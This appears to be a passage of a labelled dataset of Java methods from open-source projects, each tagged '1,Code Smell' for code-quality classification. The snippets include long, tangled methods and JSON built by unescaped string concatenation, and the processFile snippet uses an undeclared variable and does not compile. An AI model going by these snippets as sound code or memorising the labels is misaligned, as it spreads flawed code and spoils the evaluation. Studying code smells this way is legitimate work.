  String requestUrl=request.getRequestURI();
  String httpMethod=request.getMethod();
  String remoteAddress=NetworkUtils.getClientIpAddress(request);
  Object[] args=joinPoint.getArgs();
  String groupId="""";
  String streamId="""";
  for (  Object arg : args) {
    try {
      JSONObject obj=(JSONObject)JSON.toJSON(arg);
      for (      String key : obj.keySet()) {
        if (Objects.equals(key,INLONG_GROUP_ID)) {
          groupId=obj.getString(key);
        }
        if (Objects.equals(key,INLONG_STREAM_ID)) {
          streamId=obj.getString(key);
        }
      }
    }
 catch (    Exception ignored) {
      log.debug(""do nothing when exception"");
    }
  }
  String param=GSON.toJson(request.getParameterMap());
  String body=GSON.toJson(joinPoint.getArgs());
  long start=System.currentTimeMillis();
  boolean success=true;
  String errMsg="""";
  try {
    return joinPoint.proceed();
  }
 catch (  Throwable throwable) {
    success=false;
    errMsg=throwable.getMessage();
    throw throwable;
  }
 finally {
    long costTime=System.currentTimeMillis() - start;
    OperationType operationType=operationLog.operation();
    OperationTarget operationTarget=operationLog.operationTarget();
    OperationLogEntity operationLogEntity=new OperationLogEntity();
    operationLogEntity.setInlongGroupId(groupId);
    operationLogEntity.setInlongStreamId(streamId);
    operationLogEntity.setOperationTarget(operationTarget.name());
    operationLogEntity.setOperationType(operationType.name());
    operationLogEntity.setHttpMethod(httpMethod);
    operationLogEntity.setOperator(operator);
    operationLogEntity.setRequestUrl(requestUrl);
    operationLogEntity.setRemoteAddress(remoteAddress);
    operationLogEntity.setCostTime(costTime);
    operationLogEntity.setBody(body);
    operationLogEntity.setParam(param);
    operationLogEntity.setStatus(success);
    operationLogEntity.setRequestTime(new Date());
    operationLogEntity.setErrMsg(errMsg);
    if (operationLog.db()) {
      OperationLogPool.publish(operationLogEntity);
    }
 else     if (success) {
      log.info(""operation log: {}"",GSON.toJson(operationLogEntity));
    }
 else {
      log.error(""request handle failed : {}"",GSON.toJson(operationLogEntity));
    }
  }
}
",1,Code Smell
"/** 
 * get alignment position relative to optical left/top of itemView.
 */
static int getAlignmentPosition(View itemView,ItemAlignmentFacet.ItemAlignmentDef facet,int orientation){
  LayoutParams p=(LayoutParams)itemView.getLayoutParams();
  View view=itemView;
  if (facet.mViewId != 0) {
    view=itemView.findViewById(facet.mViewId);
    if (view == null) {
      view=itemView;
    }
  }
  int alignPos=facet.mOffset;
  if (orientation == HORIZONTAL) {
    if (itemView.getLayoutDirection() == View.LAYOUT_DIRECTION_RTL) {
      alignPos=(view == itemView ? p.getOpticalWidth(view) : view.getWidth()) - alignPos;
      if (facet.mOffsetWithPadding) {
        if (facet.mOffsetPercent == 0f) {
          alignPos-=view.getPaddingRight();
        }
 else         if (facet.mOffsetPercent == 100f) {
          alignPos+=view.getPaddingLeft();
        }
      }
      if (facet.mOffsetPercent != ITEM_ALIGN_OFFSET_PERCENT_DISABLED) {
        alignPos-=(int)(((view == itemView ? p.getOpticalWidth(view) : view.getWidth()) * facet.mOffsetPercent) / 100f);
      }
      if (itemView != view) {
        sRect.right=alignPos;
        ((ViewGroup)itemView).offsetDescendantRectToMyCoords(view,sRect);
        alignPos=sRect.right + p.getOpticalRightInset();
      }
    }
 else {
      if (facet.mOffsetWithPadding) {
        if (facet.mOffsetPercent == 0f) {
          alignPos+=view.getPaddingLeft();
        }
 else         if (facet.mOffsetPercent == 100f) {
          alignPos-=view.getPaddingRight();
        }
      }
      if (facet.mOffsetPercent != ITEM_ALIGN_OFFSET_PERCENT_DISABLED) {
        alignPos+=(int)(((view == itemView ? p.getOpticalWidth(view) : view.getWidth()) * facet.mOffsetPercent) / 100f);
      }
      if (itemView != view) {
        sRect.left=alignPos;
        ((ViewGroup)itemView).offsetDescendantRectToMyCoords(view,sRect);
        alignPos=sRect.left - p.getOpticalLeftInset();
      }
    }
  }
 else {
    if (facet.mOffsetWithPadding) {
      if (facet.mOffsetPercent == 0f) {
        alignPos+=view.getPaddingTop();
      }
 else       if (facet.mOffsetPercent == 100f) {
        alignPos-=view.getPaddingBottom();
      }
    }
    if (facet.mOffsetPercent != ITEM_ALIGN_OFFSET_PERCENT_DISABLED) {
      alignPos+=(int)(((view == itemView ? p.getOpticalHeight(view) : view.getHeight()) * facet.mOffsetPercent) / 100f);
    }
    if (itemView != view) {
      sRect.top=alignPos;
      ((ViewGroup)itemView).offsetDescendantRectToMyCoords(view,sRect);
      alignPos=sRect.top - p.getOpticalTopInset();
    }
    if (facet.isAlignedToTextViewBaseLine()) {
      alignPos+=view.getBaseline();
    }
  }
  return alignPos;
}",1,Code Smell
"private void fixLayoutInternal(final boolean resume){
  if (listView != null) {
    int height=(actionBar.getOccupyStatusBar() ? AndroidUtilities.statusBarHeight : 0) + ActionBar.getCurrentActionBarHeight();
    int viewHeight=fragmentView.getMeasuredHeight();
    if (viewHeight == 0) {
      return;
    }
    if (locationType == LOCATION_TYPE_LIVE_VIEW) {
      overScrollHeight=viewHeight - dp(66) - height;
    }
 else     if (locationType == 2) {
      overScrollHeight=viewHeight - dp(66 + 7) - height;
    }
 else {
      overScrollHeight=viewHeight - dp(66) - height;
    }
    FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)listView.getLayoutParams();
    layoutParams.topMargin=height;
    listView.setLayoutParams(layoutParams);
    layoutParams=(FrameLayout.LayoutParams)mapViewClip.getLayoutParams();
    layoutParams.topMargin=height;
    layoutParams.height=overScrollHeight;
    mapViewClip.setLayoutParams(layoutParams);
    if (searchListView != null) {
      layoutParams=(FrameLayout.LayoutParams)searchListView.getLayoutParams();
      layoutParams.topMargin=height;
      searchListView.setLayoutParams(layoutParams);
    }
    adapter.setOverScrollHeight(overScrollHeight);
    layoutParams=(FrameLayout.LayoutParams)mapView.getView().getLayoutParams();
    if (layoutParams != null) {
      layoutParams.height=overScrollHeight + dp(10);
      if (map != null) {
        map.setPadding(dp(70),0,dp(70),dp(10));
      }
      mapView.getView().setLayoutParams(layoutParams);
    }
    if (overlayView != null) {
      layoutParams=(FrameLayout.LayoutParams)overlayView.getLayoutParams();
      if (layoutParams != null) {
        layoutParams.height=overScrollHeight + dp(10);
        overlayView.setLayoutParams(layoutParams);
      }
    }
    adapter.notifyDataSetChanged();
    if (resume) {
      int top;
      if (locationType == 3) {
        top=73;
      }
 else       if (locationType == 1 || locationType == 2) {
        top=66;
      }
 else {
        top=0;
      }
      layoutManager.scrollToPositionWithOffset(0,-dp(top));
      updateClipView(false);
      listView.post(() -> {
        layoutManager.scrollToPositionWithOffset(0,-dp(top));
        updateClipView(false);
      }
);
    }
 else {
      updateClipView(false);
    }
  }
}",1,Code Smell
"private DenseMatrix matrixMultiplyTransposeThis(Matrix other){
  if (dim1 == other.getDimension1Size()) {
    if (other instanceof DenseMatrix) {
      DenseMatrix otherDense=(DenseMatrix)other;
      double[][] output=new double[dim2][otherDense.dim2];
      for (int i=0; i < dim2; i++) {
        for (int j=0; j < otherDense.dim2; j++) {
          output[i][j]=columnColumnDot(i,j,otherDense);
        }
      }
      return new DenseMatrix(output);
    }
 else     if (other instanceof DenseSparseMatrix) {
      DenseSparseMatrix otherSparse=(DenseSparseMatrix)other;
      int otherDim2=otherSparse.getDimension2Size();
      double[][] output=new double[dim2][otherDim2];
      for (int i=0; i < dim2; i++) {
        for (int j=0; j < otherDim2; j++) {
          output[i][j]=columnColumnDot(i,j,otherSparse);
        }
      }
      return new DenseMatrix(output);
    }
 else {
      throw new IllegalArgumentException(""Unknown matrix type "" + other.getClass().getName());
    }
  }
 else {
    throw new IllegalArgumentException(""Invalid matrix dimensions, dim1 = "" + dim1 + "", other.dim1 = ""+ other.getDimension1Size());
  }
}",1,Code Smell
"public void appendScript(Script script){
  appendScript(script,null,null);
}
public void appendScript(Script script,Script redeemScript,Script witnessScript){
  if (this.script == null) {
    this.script=script;
    ScriptContextMenu contextMenu=new ScriptContextMenu(this,script);
    setContextMenu(contextMenu);
  }
  if (P2PKH.isScriptType(script)) {
    append(script.getChunks().get(0).toString(),""script-opcode"");
    append("" "","""");
    append(script.getChunks().get(1).toString(),""script-opcode"");
    append("" "","""");
    append(""<pkh>"",""script-hash"");
    append("" "","""");
    append(script.getChunks().get(3).toString(),""script-opcode"");
    append("" "","""");
    append(script.getChunks().get(4).toString(),""script-opcode"");
  }
 else   if (P2SH.isScriptType(script)) {
    append(script.getChunks().get(0).toString(),""script-opcode"");
    append("" "","""");
    append(""<sh>"",""script-hash"");
    append("" "","""");
    append(script.getChunks().get(2).toString(),""script-opcode"");
  }
 else   if (P2WPKH.isScriptType(script)) {
    append(script.getChunks().get(0).toString(),""script-opcode"");
    append("" "","""");
    append(""<wpkh>"",""script-hash"");
  }
 else   if (P2WSH.isScriptType(script)) {
    append(script.getChunks().get(0).toString(),""script-opcode"");
    append("" "","""");
    append(""<wsh>"",""script-hash"");
  }
 else {
    int signatureCount=1;
    int pubKeyCount=1;
    for (int i=0; i < script.getChunks().size(); i++) {
      ScriptChunk chunk=script.getChunks().get(i);
      if (chunk.isOpCode()) {
        append(chunk.toString(),""script-opcode"");
      }
 else       if (chunk.isPubKey()) {
        append(""<pubkey"" + pubKeyCount++ + "">"",""script-pubkey"");
      }
 else       if (chunk.isSignature()) {
        append(""<signature"" + signatureCount++ + "">"",""script-signature"");
      }
 else       if (chunk.isTaprootControlBlock()) {
        append(""<controlblock>"",""script-controlblock"");
      }
 else       if (chunk.isString()) {
        append(chunk.toString(),""script-other"");
      }
 else       if (chunk.isScript()) {
        Script nestedScript=chunk.getScript();
        if (nestedScript.equals(redeemScript)) {
          append(""<RedeemScript>"",""script-redeem"");
        }
 else         if (nestedScript.equals(witnessScript)) {
          append(""<WitnessScript>"",""script-redeem"");
        }
 else {
          append(""("",""script-nest"");
          appendScript(nestedScript);
          append("")"",""script-nest"");
        }
      }
 else {
        append(chunk.toString(),""script-other"");
      }
      if (i < script.getChunks().size() - 1) {
        append("" "","""");
      }
    }
  }
}",1,Code Smell
"@Subscribe public void openWallets(OpenWalletsEvent event){
  if (id.getScene().getWindow().equals(event.getWindow()) && headersForm.getPsbt() != null && headersForm.getBlockTransaction() == null) {
    List<Wallet> availableWallets=event.getWallets().stream().filter(wallet -> wallet.canSign(headersForm.getPsbt())).sorted(new WalletSignComparator()).collect(Collectors.toList());
    List<Wallet> signingAllInputsWallets=event.getWallets().stream().filter(wallet -> wallet.canSignAllInputs(headersForm.getPsbt())).sorted(new WalletSignComparator()).collect(Collectors.toList());
    if (availableWallets.isEmpty() || !availableWallets.equals(signingAllInputsWallets)) {
      for (      Wallet wallet : event.getWalletsMap().keySet()) {
        if (wallet.isValid() && !wallet.getSigningKeystores(headersForm.getPsbt()).isEmpty()) {
          int currentGapLimit=wallet.getGapLimit();
          Integer requiredGapLimit=wallet.getRequiredGapLimit(headersForm.getPsbt());
          if (requiredGapLimit != null && requiredGapLimit > currentGapLimit) {
            wallet.setGapLimit(requiredGapLimit);
            EventManager.get().post(new WalletGapLimitChangedEvent(event.getStorage(wallet).getWalletId(wallet),wallet,currentGapLimit));
            Platform.runLater(() -> EventManager.get().post(new RequestOpenWalletsEvent()));
          }
        }
      }
    }
    Map<Wallet,Storage> availableWalletsMap=new LinkedHashMap<>(event.getWalletsMap());
    availableWalletsMap.keySet().retainAll(availableWallets);
    headersForm.getAvailableWallets().keySet().retainAll(availableWallets);
    headersForm.getAvailableWallets().putAll(availableWalletsMap);
    signingWallet.setItems(FXCollections.observableList(availableWallets));
    if (!availableWallets.isEmpty()) {
      if (!headersForm.isEditable() && (availableWallets.size() == 1 || headersForm.getPsbt().isSigned())) {
        signingWalletForm.setVisible(false);
        sigHashForm.setVisible(false);
        finalizeButtonBox.setVisible(false);
        signaturesForm.setVisible(true);
        headersForm.setSigningWallet(availableWallets.get(0));
        signButton.setDisable(false);
        if (headersForm.getPsbt().isSigned()) {
          finalizePSBT();
          broadcastButtonBox.setVisible(true);
        }
 else {
          signButtonBox.setVisible(true);
        }
      }
 else {
        if (availableWallets.contains(headersForm.getSigningWallet())) {
          signingWallet.setValue(headersForm.getSigningWallet());
        }
 else {
          signingWallet.setValue(availableWallets.get(0));
        }
        noWalletsWarning.setVisible(false);
        signingWallet.setVisible(true);
        finalizeTransaction.setDisable(false);
        signButton.setDisable(false);
      }
    }
 else {
      if (headersForm.getPsbt().isSigned()) {
        if (headersForm.getSigningWallet() == null) {
          Wallet signedWallet=new FinalizingPSBTWallet(headersForm.getPsbt());
          headersForm.setSigningWallet(signedWallet);
        }
        finalizePSBT();
        broadcastButtonBox.setVisible(true);
      }
 else {
        noWalletsWarning.setVisible(true);
        signingWallet.setVisible(false);
        finalizeTransaction.setDisable(true);
        signButton.setDisable(true);
      }
    }
  }
}",1,Code Smell
"public View build(DialogInterface dialog){
  View v=View.inflate(mContext,R.layout.dialog_title_toolbar,null);
  MaterialToolbar toolbar=v.findViewById(R.id.toolbar);
  if (mTitle != null)   toolbar.setTitle(mTitle);
 else   if (mTitleRes != 0)   toolbar.setTitle(mTitleRes);
  if (mCloseButtonIcon != null) {
    toolbar.setNavigationIcon(mCloseButtonIcon);
  }
  if (mOnCloseButtonClickListener != null) {
    toolbar.setNavigationOnClickListener(v1 -> {
      mOnCloseButtonClickListener.onClick(dialog,AlertDialog.BUTTON_NEGATIVE);
      if (mExitOnButtonPress)       dialog.dismiss();
    }
);
  }
 else {
    toolbar.setNavigationOnClickListener(v1 -> dialog.dismiss());
  }
  if (mCloseIconDescription != null) {
    toolbar.setNavigationContentDescription(mCloseIconDescription);
  }
 else {
    toolbar.setNavigationContentDescription(mCloseIconDescriptionRes);
  }
  MaterialButton positiveButton=v.findViewById(android.R.id.button1);
  if (mOnPositiveButtonClickListener != null) {
    positiveButton.setOnClickListener(v1 -> {
      mOnPositiveButtonClickListener.onClick(dialog,AlertDialog.BUTTON_POSITIVE);
      if (mExitOnButtonPress)       dialog.dismiss();
    }
);
  }
 else {
    positiveButton.setOnClickListener(v1 -> dialog.dismiss());
  }
  if (mPositiveButtonIcon != null) {
    positiveButton.setIcon(mPositiveButtonIcon);
    positiveButton.setIconPadding(0);
    positiveButton.setIconGravity(MaterialButton.ICON_GRAVITY_TEXT_TOP);
    positiveButton.setText(null);
    if (mPositiveButtonText != null) {
      positiveButton.setContentDescription(mPositiveButtonText);
    }
 else     if (mPositiveButtonTextRes != 0) {
      positiveButton.setContentDescription(mContext.getString(mPositiveButtonTextRes));
    }
  }
 else   if (mPositiveButtonText != null) {
    positiveButton.setText(mPositiveButtonText);
  }
 else   if (mPositiveButtonTextRes != 0) {
    positiveButton.setText(mPositiveButtonTextRes);
  }
 else   positiveButton.setVisibility(View.GONE);
  return v;
}",1,Code Smell
"/** 
 * This implementation avoids iterating over empty chunk sections and uses direct access to read out block states instead. Instead of allocating a BlockPos for every block in the chunk, they're now only allocated once we find a light source.
 * @reason Use optimized implementation
 * @author JellySquid
 */
@Overwrite public Stream<BlockPos> getLightSourcesStream(){
  List<BlockPos> list=new ArrayList<>();
  int startX=this.pos.getStartX();
  int startZ=this.pos.getStartZ();
  ChunkSection[] chunkSections=this.sectionArray;
  for (  ChunkSection section : chunkSections) {
    if (section == null || section.isEmpty()) {
      continue;
    }
    int startY=section.getYOffset();
    for (int x=0; x < 16; x++) {
      for (int y=0; y < 16; y++) {
        for (int z=0; z < 16; z++) {
          BlockState state=section.getBlockState(x,y,z);
          if (state.getLuminance() != 0) {
            list.add(new BlockPos(startX + x,startY + y,startZ + z));
          }
        }
      }
    }
  }
  if (list.isEmpty()) {
    return Stream.empty();
  }
  return list.stream();
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public Boolean categoryEnableOrDisable(CategoryDTO categoryDTO){
  CategoryVO categoryDb=categoryService.getById(categoryDTO.getCategoryId());
  if (Objects.equals(categoryDb.getStatus(),categoryDTO.getStatus())) {
    return Boolean.TRUE;
  }
  List<Long> updateList=new ArrayList<>();
  List<Long> thirdIdList=new ArrayList<>();
  if (!categoryDb.getLevel().equals(CategoryLevel.THIRD.value())) {
    if (!Objects.equals(categoryDb.getShopId(),Constant.PLATFORM_SHOP_ID) && Objects.equals(categoryDb.getLevel(),CategoryLevel.SECOND.value())) {
      thirdIdList.add(categoryDb.getCategoryId());
    }
    List<Category> categoryList=categoryService.getChildCategory(categoryDb.getCategoryId());
    categoryList.forEach(category -> {
      updateList.add(category.getCategoryId());
      if (Objects.equals(categoryDb.getShopId(),Constant.PLATFORM_SHOP_ID) && Objects.equals(category.getLevel(),CategoryLevel.THIRD.value())) {
        thirdIdList.add(category.getCategoryId());
      }
 else       if (!Objects.equals(categoryDb.getShopId(),Constant.PLATFORM_SHOP_ID) && Objects.equals(category.getLevel(),CategoryLevel.SECOND.value())) {
        thirdIdList.add(category.getCategoryId());
      }
    }
);
  }
 else {
    updateList.add(categoryDb.getCategoryId());
    thirdIdList.add(categoryDb.getCategoryId());
  }
  updateList.add(categoryDb.getCategoryId());
  categoryService.updateBatchOfStatus(updateList,categoryDTO.getStatus());
  categoryService.removeCategoryCache(AuthUserContext.get().getTenantId(),null);
  if (Objects.equals(categoryDTO.getStatus(),StatusEnum.DISABLE.value())) {
    if (CollUtil.isEmpty(thirdIdList)) {
      return Boolean.TRUE;
    }
    spuService.batchChangeSpuStatusByCids(thirdIdList,categoryDb.getShopId(),StatusEnum.DISABLE.value());
  }
  return Boolean.TRUE;
}
",1,Code Smell
"/** 
 * Query all consumer groups booked on the Broker.
 * @param req      request
 * @param sBuffer  process result
 */
public void adminQueryBookedGroup(HttpServletRequest req,StringBuilder sBuffer){
  ProcessResult result=new ProcessResult();
  if (!WebParameterUtils.getBooleanParamValue(req,WebFieldDef.WITHDIVIDE,false,false,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return;
  }
  boolean withDivide=(boolean)result.getRetData();
  int itemCnt=0;
  int totalCnt=0;
  OffsetService offsetService=broker.getOffsetManager();
  sBuffer.append(""{\""result\"":true,\""errCode\"":0,\""errMsg\"":\""Success!\"",\""dataSet\"":["");
  if (withDivide) {
    Set<String> onlineGroups=offsetService.getInMemoryGroups();
    sBuffer.append(""{\""type\"":\""in-cache\"",\""groupName\"":["");
    for (    String group : onlineGroups) {
      if (itemCnt++ > 0) {
        sBuffer.append("","");
      }
      sBuffer.append(""\"""").append(group).append(""\"""");
    }
    sBuffer.append(""],\""groupCount\"":"").append(itemCnt).append(""}"");
    totalCnt++;
    sBuffer.append("","");
    itemCnt=0;
    Set<String> onZKGroup=offsetService.getUnusedGroupInfo();
    sBuffer.append(""{\""type\"":\""in-zk\"",\""groupName\"":["");
    for (    String group : onZKGroup) {
      if (itemCnt++ > 0) {
        sBuffer.append("","");
      }
      sBuffer.append(""\"""").append(group).append(""\"""");
    }
    sBuffer.append(""],\""groupCount\"":"").append(itemCnt).append(""}"");
    totalCnt++;
  }
 else {
    Set<String> allGroups=offsetService.getBookedGroups();
    sBuffer.append(""{\""type\"":\""all\"",\""groupName\"":["");
    for (    String group : allGroups) {
      if (itemCnt++ > 0) {
        sBuffer.append("","");
      }
      sBuffer.append(""\"""").append(group).append(""\"""");
    }
    sBuffer.append(""],\""groupCount\"":"").append(itemCnt).append(""}"");
    totalCnt++;
  }
  sBuffer.append(""],\""dataCount\"":"").append(totalCnt).append(""}"");
}",1,Code Smell
"private static void processFile(File file) throws Exception {
  DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();
  factory.setNamespaceAware(false);
  DocumentBuilder builder=factory.newDocumentBuilder();
  Document doc;
  try (FileInputStream in=new FileInputStream(file)){
    doc=builder.parse(in);
  }
   NodeList list=doc.getDocumentElement().getChildNodes();
  for (int i=0; i < list.getLength(); i++) {
    if (list.item(i) instanceof Element) {
      String name=el.getAttribute(""name"");
      String value;
      if (""string"".equals(el.getTagName())) {
        value=el.getTextContent();
        if (!verifyString(value,placeholdersInStrings.get(name))) {
          errorCount++;
          System.out.println(file + "": string "" + name+ "" is missing placeholders"");
        }
      }
 else       if (""plurals"".equals(el.getTagName())) {
        NodeList items=el.getElementsByTagName(""item"");
        for (int j=0; j < items.getLength(); j++) {
          Element item=(Element)items.item(j);
          value=item.getTextContent();
          String quantity=item.getAttribute(""quantity"");
          if (!verifyString(value,placeholdersInStrings.get(name))) {
            if (List.of(""zero"",""one"",""two"").contains(quantity) && !value.contains(""%"")) {
              continue;
            }
            errorCount++;
            System.out.println(file + "": string "" + name+ ""[""+ quantity+ ""] is missing placeholders"");
          }
        }
      }
 else {
        System.out.println(""Warning: unexpected tag "" + name);
        continue;
      }
    }
  }
}",1,Code Smell
"public static int splitArray2(int[] nums,int K){
  int N=nums.length;
  int[] sum=new int[N + 1];
  for (int i=0; i < N; i++) {
    sum[i + 1]=sum[i] + nums[i];
  }
  int[][] dp=new int[N][K + 1];
  int[][] best=new int[N][K + 1];
  for (int j=1; j <= K; j++) {
    dp[0][j]=nums[0];
    best[0][j]=-1;
  }
  for (int i=1; i < N; i++) {
    dp[i][1]=sum(sum,0,i);
    best[i][1]=-1;
  }
  for (int j=2; j <= K; j++) {
    for (int i=N - 1; i >= 1; i--) {
      int down=best[i][j - 1];
      int up=i == N - 1 ? N - 1 : best[i + 1][j];
      int ans=Integer.MAX_VALUE;
      int bestChoose=-1;
      for (int leftEnd=down; leftEnd <= up; leftEnd++) {
        int leftCost=leftEnd == -1 ? 0 : dp[leftEnd][j - 1];
        int rightCost=leftEnd == i ? 0 : sum(sum,leftEnd + 1,i);
        int cur=Math.max(leftCost,rightCost);
        if (cur < ans) {
          ans=cur;
          bestChoose=leftEnd;
        }
      }
      dp[i][j]=ans;
      best[i][j]=bestChoose;
    }
  }
  return dp[N - 1][K];
}",1,Code Smell
"public static boolean verify(@NonNull SigSchemes sigSchemes,@NonNull File apk,@Nullable File idsig){
  ApkVerifier.Builder builder=new ApkVerifier.Builder(apk).setMaxCheckedPlatformVersion(Build.VERSION.SDK_INT);
  if (sigSchemes.v4SchemeEnabled()) {
    if (idsig == null) {
      throw new RuntimeException(""idsig file is mandatory for v4 signature scheme."");
    }
    builder.setV4SignatureFile(idsig);
  }
  ApkVerifier verifier=builder.build();
  try {
    ApkVerifier.Result result=verifier.verify();
    Log.i(TAG,""%s"",apk);
    boolean isVerify=result.isVerified();
    if (isVerify) {
      if (sigSchemes.v1SchemeEnabled() && result.isVerifiedUsingV1Scheme())       Log.i(TAG,""V1 signature verification succeeded."");
 else       Log.w(TAG,""V1 signature verification failed/disabled."");
      if (sigSchemes.v2SchemeEnabled() && result.isVerifiedUsingV2Scheme())       Log.i(TAG,""V2 signature verification succeeded."");
 else       Log.w(TAG,""V2 signature verification failed/disabled."");
      if (sigSchemes.v3SchemeEnabled() && result.isVerifiedUsingV3Scheme())       Log.i(TAG,""V3 signature verification succeeded."");
 else       Log.w(TAG,""V3 signature verification failed/disabled."");
      if (sigSchemes.v4SchemeEnabled() && result.isVerifiedUsingV4Scheme())       Log.i(TAG,""V4 signature verification succeeded."");
 else       Log.w(TAG,""V4 signature verification failed/disabled."");
      int i=0;
      List<X509Certificate> signerCertificates=result.getSignerCertificates();
      Log.i(TAG,""Number of signatures: %d"",signerCertificates.size());
      for (      X509Certificate logCert : signerCertificates) {
        i++;
        logCert(logCert,""Signature"" + i);
      }
    }
    for (    ApkVerifier.IssueWithParams warn : result.getWarnings()) {
      Log.w(TAG,""%s"",warn);
    }
    for (    ApkVerifier.IssueWithParams err : result.getErrors()) {
      Log.e(TAG,""%s"",err);
    }
    if (sigSchemes.v1SchemeEnabled()) {
      for (      ApkVerifier.Result.V1SchemeSignerInfo signer : result.getV1SchemeIgnoredSigners()) {
        String name=signer.getName();
        for (        ApkVerifier.IssueWithParams err : signer.getErrors()) {
          Log.e(TAG,""%s: %s"",name,err);
        }
        for (        ApkVerifier.IssueWithParams err : signer.getWarnings()) {
          Log.w(TAG,""%s: %s"",name,err);
        }
      }
    }
    return isVerify;
  }
 catch (  Exception e) {
    Log.w(TAG,""Verification failed."",e);
    return false;
  }
}",1,Code Smell
"@PostMapping(value=""/auto-split-pdf"",consumes=""multipart/form-data"") @Operation(summary=""Auto split PDF pages into separate documents"",description=""This endpoint accepts a PDF file, scans each page for a specific QR code, and splits the document at the QR code boundaries. The output is a zip file containing each separate PDF document. Input:PDF Output:ZIP-PDF Type:SISO"") public ResponseEntity<byte[]> autoSplitPdf(@ModelAttribute AutoSplitPdfRequest request) throws IOException {
  MultipartFile file=request.getFileInput();
  boolean duplexMode=request.isDuplexMode();
  PDDocument document=Loader.loadPDF(file.getBytes());
  PDFRenderer pdfRenderer=new PDFRenderer(document);
  pdfRenderer.setSubsamplingAllowed(true);
  List<PDDocument> splitDocuments=new ArrayList<>();
  List<ByteArrayOutputStream> splitDocumentsBoas=new ArrayList<>();
  for (int page=0; page < document.getNumberOfPages(); ++page) {
    BufferedImage bim=pdfRenderer.renderImageWithDPI(page,150);
    String result=decodeQRCode(bim);
    if ((QR_CONTENT.equals(result) || QR_CONTENT_OLD.equals(result)) && page != 0) {
      splitDocuments.add(new PDDocument());
    }
    if (!splitDocuments.isEmpty() && !QR_CONTENT.equals(result) && !QR_CONTENT_OLD.equals(result)) {
      splitDocuments.get(splitDocuments.size() - 1).addPage(document.getPage(page));
    }
 else     if (page == 0) {
      PDDocument firstDocument=new PDDocument();
      firstDocument.addPage(document.getPage(page));
      splitDocuments.add(firstDocument);
    }
    if (duplexMode && (QR_CONTENT.equals(result) || QR_CONTENT_OLD.equals(result))) {
      page++;
    }
  }
  splitDocuments.removeIf(pdDocument -> pdDocument.getNumberOfPages() == 0);
  for (  PDDocument splitDocument : splitDocuments) {
    ByteArrayOutputStream baos=new ByteArrayOutputStream();
    splitDocument.save(baos);
    splitDocumentsBoas.add(baos);
    splitDocument.close();
  }
  document.close();
  Path zipFile=Files.createTempFile(""split_documents"","".zip"");
  String filename=Filenames.toSimpleFileName(file.getOriginalFilename()).replaceFirst(""[.][^.]+$"","""");
  byte[] data;
  try (ZipOutputStream zipOut=new ZipOutputStream(Files.newOutputStream(zipFile))){
    for (int i=0; i < splitDocumentsBoas.size(); i++) {
      String fileName=filename + ""_"" + (i + 1)+ "".pdf"";
      ByteArrayOutputStream baos=splitDocumentsBoas.get(i);
      byte[] pdf=baos.toByteArray();
      ZipEntry pdfEntry=new ZipEntry(fileName);
      zipOut.putNextEntry(pdfEntry);
      zipOut.write(pdf);
      zipOut.closeEntry();
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
 finally {
    data=Files.readAllBytes(zipFile);
    Files.delete(zipFile);
  }
  return WebResponseUtils.bytesToWebResponse(data,filename + "".zip"",MediaType.APPLICATION_OCTET_STREAM);
}",1,Code Smell
"private void addExtraEmptyScreenOnDrag(DragObject dragObject){
  boolean lastChildOnScreen=false;
  boolean childOnFinalScreen=false;
  if (mDragSourceInternal != null) {
    int dragSourceChildCount=mDragSourceInternal.getChildCount();
    if (isTwoPanelEnabled() && !(mDragSourceInternal.getParent() instanceof Hotseat)) {
      int pagePairScreenId=getScreenPair(getCellPosMapper().mapModelToPresenter(dragObject.dragInfo).screenId);
      CellLayout pagePair=mWorkspaceScreens.get(pagePairScreenId);
      dragSourceChildCount+=pagePair.getShortcutsAndWidgets().getChildCount();
    }
    if (dragObject.dragView.getContentView() instanceof LauncherAppWidgetHostView) {
      dragSourceChildCount++;
    }
    if (dragSourceChildCount == 1) {
      lastChildOnScreen=true;
    }
    CellLayout cl=(CellLayout)mDragSourceInternal.getParent();
    if (!FOLDABLE_SINGLE_PAGE.get() && getLeftmostVisiblePageForIndex(indexOfChild(cl)) == getLeftmostVisiblePageForIndex(getPageCount() - 1)) {
      childOnFinalScreen=true;
    }
  }
  if (lastChildOnScreen && childOnFinalScreen) {
    return;
  }
  forEachExtraEmptyPageId(extraEmptyPageId -> {
    if (!mWorkspaceScreens.containsKey(extraEmptyPageId)) {
      insertNewWorkspaceScreen(extraEmptyPageId);
    }
  }
);
}",1,Code Smell
"@Override public void processViewAction(@NonNull View view,String data,@NonNull ResultData result){
  HashSet<FieldInfo> fieldSet=new HashSet<>();
  Class javaClass=view.getClass();
  while (javaClass != Object.class) {
    try {
      final Field[] declaredFields=javaClass.getDeclaredFields();
      for (      Field field : declaredFields) {
        FieldInfo fieldInfo=getFieldInfo(view,field);
        if (fieldInfo == null) {
          continue;
        }
        fieldSet.add(fieldInfo);
      }
    }
 catch (    Throwable t) {
    }
    javaClass=javaClass.getSuperclass();
  }
  List<MethodInfo> allMethodInfo=getAllMethodInfo(view.getClass());
  HashMap<String,MethodInfo> methodMap=new HashMap<>();
  for (  MethodInfo methodInfo : allMethodInfo) {
    if (""boolean"".equalsIgnoreCase(methodInfo.getReturnType()) && methodInfo.getName().startsWith(""is"")) {
      String fieldName=methodInfo.getName().substring(""is"".length());
      methodMap.put(methodInfo.getName(),methodInfo);
      if (methodMap.containsKey(""set"" + fieldName)) {
        addMockField(view,fieldName,methodInfo.getReturnType(),fieldSet,methodInfo.getMethod());
      }
    }
 else     if (methodInfo.getName().startsWith(""get"")) {
      String fieldName=methodInfo.getName().substring(""get"".length());
      methodMap.put(methodInfo.getName(),methodInfo);
      if (methodMap.containsKey(""set"" + fieldName)) {
        addMockField(view,fieldName,methodInfo.getReturnType(),fieldSet,methodInfo.getMethod());
      }
    }
 else     if (methodInfo.getName().startsWith(""set"")) {
      String fieldName=methodInfo.getName().substring(""get"".length());
      methodMap.put(methodInfo.getName(),methodInfo);
      if (methodMap.containsKey(""get"" + fieldName)) {
        addMockField(view,fieldName,methodInfo.getArgType(),fieldSet,methodMap.get(""get"" + fieldName).getMethod());
      }
    }
  }
  ViewClassInfo viewClassInfo=new ViewClassInfo();
  final ArrayList<FieldInfo> fieldInfoList=new ArrayList<>();
  fieldInfoList.addAll(fieldSet);
  viewClassInfo.setFieldInfoList(fieldInfoList);
